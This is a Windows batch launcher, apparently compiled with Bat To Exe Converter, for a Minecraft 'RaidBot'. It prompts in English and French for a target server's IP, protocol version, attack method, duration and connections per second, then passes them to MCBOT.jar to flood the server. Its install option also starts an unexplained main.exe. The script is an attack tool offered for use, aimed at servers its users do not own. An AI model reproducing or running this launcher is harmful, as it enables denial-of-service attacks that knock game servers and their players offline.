::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBFbQgyDAE+1EbsQ5+n//NarrUoSeesxfYzJ27KaIu8HpEznevY=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQIWOh5VRw2gM3/a
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQIWOh5VRw2gM3/6FrAO5e3vr+6C4n8cXeZ/fo7Y07iLLeUd/iU=
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJHuR5kcxPVt3cAmBPmSuS7gd4ebHw+uSrE4VGucnfe8=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color c
echo.
::: ______  _____ _____ 
::: | ___ \|  _  |_   _|
::: | |_/ /| | | | | |  
::: | ___ \| | | | | |  
::: | |_/ /\ \_/ / | |  
::: \____/  \___/  \_/  
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A
echo.
:startmenu
@echo By Freakidann
echo 1 Install requirements.txt
echo 2 Launch RaidBot
set /p reponse=
if "%reponse%" == "1" goto requirements
if "%reponse%" == "2" goto RaidBot

:requirements
python3 -m pip install -r requirements.txt
npm install mineflayer
npm install process
start main.exe
goto startmenu

:RaidBot
cls
echo EN IP:PORT , IP and port of the server , Examples: 36.90.48.40:25577 or mc.server.com
echo FR IP:PORT , IP et port du serveur , Examples: 36.90.48.40:25577 or mc.server.com
set /p IP=
echo.
cls
start python3 MCPTool.py
echo EN PROTOCOL , Protocol version of the server , To know the Protocol of the server you only have to write "server [ip]" in MCPTool exemple server Freakidann.aternos.me
echo FR PROTOCOL , Protocol version du server , Pour connaitre le Protocol du serveur il vous suffi d ecrire  "server [ip]" dans MCPTool exemple server Freakidann.aternos.me
set /p Protocol=
echo.
cls
echo EN METHOD , Which method should be used to attack , methods file start...
echo FR METHOD , Quelle methode doit etre utilise pour attaquer , methods file start...
start methods.txt
set /p METHOD=
echo.
cls
echo EN SECONDS , How long should the attack last , Examples: 60 or 300
echo FR SECONDS , La durée de l’attaque , Examples: 60 or 300
set /p SECONDS=
echo.
cls
echo EN TARGETCPS , How many connections per second , Examples: 1000 or 50000
echo FR TARGETCPS , Combien de connexions par seconde , Examples: 1000 or 50000
set /p CPS=
cls
echo Lancement
java -jar MCBOT.jar %IP% %Protocol% %METHOD% %SECONDS% %CPS%
